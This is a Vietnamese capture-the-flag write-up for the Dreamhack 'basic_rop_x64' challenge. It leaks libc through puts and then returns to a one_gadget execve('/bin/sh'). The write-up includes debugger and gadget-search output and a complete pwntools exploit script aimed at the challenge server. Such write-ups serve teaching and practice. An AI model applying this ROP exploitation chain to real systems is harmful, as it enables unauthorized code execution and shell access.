# Challenge: Basic Rop X64

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/basic_ropx64/basic_rop_x64)
- Khi thực thi, chương trình cho user input và sau đó output đoạn đã nhập và exit().
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[64]; // [rsp+10h] [rbp-40h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF

  memset(buf, 0, sizeof(buf));
  initialize(&savedregs, argv, buf);
  read(0, buf, 0x400u);
  write(1, buf, 64u);
  return 0;
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Partial RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ Stripped:   No
```

## Giải pháp
- Vì chương trình tắt PIE nên có thể nắm được sym, got hay plt của chương trình.
```
pwndbg> got 
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/haiwh/CTF/Dreamhack/basic_rop_x64/basic_rop_x64_patched:
GOT protection: Partial RELRO | Found 8 GOT entries passing the filter
[0x601018] puts@GLIBC_2.2.5 -> 0x4005c6 (puts@plt+6) ◂— push 0 /* 'h' */
[0x601020] write@GLIBC_2.2.5 -> 0x4005d6 (write@plt+6) ◂— push 1
[0x601028] alarm@GLIBC_2.2.5 -> 0x4005e6 (alarm@plt+6) ◂— push 2
[0x601030] read@GLIBC_2.2.5 -> 0x4005f6 (read@plt+6) ◂— push 3
[0x601038] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7c29dc0 (__libc_start_main_impl) ◂— endbr64
[0x601040] signal@GLIBC_2.2.5 -> 0x400616 (signal@plt+6) ◂— push 5
[0x601048] setvbuf@GLIBC_2.2.5 -> 0x400626 (setvbuf@plt+6) ◂— push 6
[0x601050] exit@GLIBC_2.2.5 -> 0x400636 (exit@plt+6) ◂— push 7
```
> Có thể overwrite ret về lại main để chạy thêm lần nữa.
- Từ đó, lần chạy đầu có thể dùng để leak dữ liệu nào đó.
> Sau khi leak được dữ liệu có thể overwrite ret để có được shell.

## Quá trình
- **Hướng giải quyết đầu tiên:** khi có thể leak được dữ liệu là overwrite ret bằng system("/bin/sh"). Với sơ đầu như sau:
> Leak libc -> Dùng libc tìm "/bin/sh" -> Dùng libc.sym['system'] -> Đẩy vào ret để lấy shell.
- Nhưng quá trình này gặp vấn đề vì khi có được libc rồi nhưng địa chỉ của "/bin/sh" và system có vấn đề nên không thể sử dụng cách này được.
- **Hướng giải quyết thứ 2:** sau khi đã có được libc, ta sử dụng kỹ thuật _one gadget_ xem có thể khai thác không.
```
└─$ one_gadget libc.so.6     
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```
- Sau khi check, tôi thấy có thể sử dụng kỹ thuật one gadget này nhưng vấn đề là làm sao để gắn các yêu cầu của kỹ thuật thì phải check qua ROPgadget xem có những gadget nào có thể sử dụng.
```
└─$ rop basic_rop_x64 pop
[*] Đang tìm 'pop' trong basic_rop_x64...
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: basic_rop_x64
0x000000000040087c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040087e: pop r13; pop r14; pop r15; ret; 
0x0000000000400880: pop r14; pop r15; ret; 
0x0000000000400882: pop r15; ret; 
0x000000000040069f: pop rbp; mov edi, 0x601068; jmp rax; 
0x00000000004006ed: pop rbp; mov edi, 0x601068; jmp rax; nop dword ptr [rax]; pop rbp; ret; 
0x000000000040069f: pop rbp; mov edi, 0x601068; jmp rax; nop word ptr [rax + rax]; pop rbp; ret; 
0x000000000040087b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040087f: pop rbp; pop r14; pop r15; ret; 
0x00000000004006b0: pop rbp; ret; 
0x0000000000400883: pop rdi; ret; 
0x0000000000400881: pop rsi; pop r15; ret; 
0x000000000040087d: pop rsp; pop r13; pop r14; pop r15; ret;
```
- Và có thể thấy, ta có địa chỉ **0x000000000040087b** chứa các yêu cầu của kỹ thuật ở địa chỉ **0xebd52** của one gadget. Do đó ta sẽ dùng nó để khai thác và lấy shell.
- Trước tiên, xem ROPgadget thấy rằng có pop rdi ở địa chỉ **0x0000000000400883**, do đó có thể dùng nó để đẩy put GOT vào put PLT để leak địa chỉ puts trong libc.
```
pop_rdi = 0x0000000000400883
payload1 = flat(
    b'A'*8*8,
    b'B'*8,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'],
    )
sl(payload1)

p.recv(0x40)
puts_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = puts_leak - libc.sym['puts']
info("Puts leak: " + hex(puts_leak))
info("Libc address: " + hex(libc.address))
```
- Sau khi có được libc base, ta có thể dùng nó + offset để nhảy tới one gadget chứa execve("/bin/sh", rbp-0x50, r12) với yêu cầu r12, [r12] và r13 là NULL và ở rbp-0x48 có thể writable.
- Vấn đề r12, [r12] và r13 thì ROPgadget **0x000000000040087b** có thể giải quyết còn rbp-0x48 thì cần phải check vmmap xem địa chỉ nào có thể writable.
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x3fe000           0x3ff000 rw-p     1000       0 basic_rop_x64_patched
          0x400000           0x401000 r-xp     1000    2000 basic_rop_x64_patched
          0x600000           0x601000 r--p     1000    2000 basic_rop_x64_patched
          0x601000           0x602000 rw-p     1000    3000 basic_rop_x64_patched
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 libc.so.6
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 libc.so.6
    0x7ffff7e15000     0x7ffff7e19000 r--p     4000  214000 libc.so.6
    0x7ffff7e19000     0x7ffff7e1b000 rw-p     2000  218000 libc.so.6
    0x7ffff7e1b000     0x7ffff7e28000 rw-p     d000       0 [anon_7ffff7e1b]
    0x7ffff7fb6000     0x7ffff7fbb000 rw-p     5000       0 [anon_7ffff7fb6]
    0x7ffff7fbb000     0x7ffff7fbf000 r--p     4000       0 [vvar]
    0x7ffff7fbf000     0x7ffff7fc1000 r--p     2000       0 [vvar_vclock]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 ld-2.35.so
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 ld-2.35.so
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 ld-2.35.so
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 ld-2.35.so
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 ld-2.35.so
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack]
```
- Do PIE tắt, địa chỉ cố định nên ta có thể check xem trong địa chỉ **0x601000** phần nào trống.
```
pwndbg> x/50xg 0x601000
0x601000:       0x0000000000600e28      0x00007ffff7ffe2e0
0x601010:       0x00007ffff7fd8d30      0x00000000004005c6
0x601020 <write@got.plt>:       0x00000000004005d6      0x00000000004005e6
0x601030 <read@got.plt>:        0x00000000004005f6      0x00007ffff7c29dc0
0x601040 <signal@got.plt>:      0x0000000000400616      0x0000000000400626
0x601050 <exit@got.plt>:        0x0000000000400636      0x0000000000000000
0x601060:       0x0000000000000000      0x0000000000000000
0x601070 <stdout@@GLIBC_2.2.5>: 0x00007ffff7e1a780      0x0000000000000000
0x601080 <stdin@@GLIBC_2.2.5>:  0x00007ffff7e19aa0      0x0000000000000000
0x601090:       0x0000000000000000      0x0000000000000000
0x6010a0:       0x0000000000000000      0x0000000000000000
0x6010b0:       0x0000000000000000      0x0000000000000000
0x6010c0:       0x0000000000000000      0x0000000000000000
0x6010d0:       0x0000000000000000      0x0000000000000000
0x6010e0:       0x0000000000000000      0x0000000000000000
0x6010f0:       0x0000000000000000      0x0000000000000000
0x601100:       0x0000000000000000      0x0000000000000000
0x601110:       0x0000000000000000      0x0000000000000000
0x601120:       0x0000000000000000      0x0000000000000000
0x601130:       0x0000000000000000      0x0000000000000000
0x601140:       0x0000000000000000      0x0000000000000000
0x601150:       0x0000000000000000      0x0000000000000000
0x601160:       0x0000000000000000      0x0000000000000000
0x601170:       0x0000000000000000      0x0000000000000000
0x601180:       0x0000000000000000      0x0000000000000000
```
- Ở địa chỉ **0x601090**, có thể sử dụng và vì rbp-0x48 nên khi đẩy vào payload nhớ + 0x48 trước để khi bị trừ thì vẫn ở đúng vị trí cần dùng.
```
payload2 = flat(
    b'A'*8*9,
    pop_csu, 
    0x6010d8, # Dia chi co the write 
    0,
    0,
    0,
    0,
    libc.address + 0xebd52,
    )
sl(payload2)
```

### Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('basic_rop_x64', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+94
        c
        b*main+62
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 21978)
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak libc
pop_rdi = 0x0000000000400883
payload1 = flat(
    b'A'*8*8,
    b'B'*8,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'],
    )
sl(payload1)

p.recv(0x40)
puts_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = puts_leak - libc.sym['puts']
info("Puts leak: " + hex(puts_leak))
info("Libc address: " + hex(libc.address))

### STAGE 2: Get shell
pop_csu = 0x000000000040087b
##################################
### Test use system("/bin/sh") ###
##################################

# binsh_addr = next(libc.search(b'/bin/sh\x00'))
# system_addr = libc.sym['system']

##################
### One Gadget ###
##################
payload2 = flat(
    b'A'*8*9,
    pop_csu, 
    0x6010d8, # Dia chi co the write 
    0,
    0,
    0,
    0,
    libc.address + 0xebd52,
    )
sl(payload2)

p.interactive()
```
